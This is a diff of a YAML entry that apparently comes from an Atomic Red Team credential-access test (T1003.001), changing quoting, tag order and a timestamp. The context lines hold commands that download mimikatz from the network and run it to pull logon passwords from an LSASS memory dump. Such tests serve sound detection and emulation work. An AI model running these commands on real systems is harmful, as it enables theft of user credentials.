@@ -19,7 +19,7 @@
           $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
           | where-object { $_.endswith(".zip") }; $basePath = Split-Path "PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe"
           | Split-Path; Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath;
-          fi; "PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe" "sekurlsa::minidump
+          fi; PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe "sekurlsa::minidump
           %tmp%\lsass.DMP" "sekurlsa::logonpasswords full" exit'
         elevation_required: true
   plugin: atomic
@@ -29,8 +29,8 @@
   privilege: ''
   buckets:
   - t1003.001
-  - atomic-red-team
   - credential-access
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -67,4 +67,4 @@
         '
     technique_created: '2020-02-11T18:41:44.783Z'
     atomic_guid: 453acf13-1dbd-47d7-b28a-172ce9228023
-    import_timestamp: '2026-06-23T06:06:46.770813Z'
+    import_timestamp: '2026-06-24T06:04:07.762233Z'
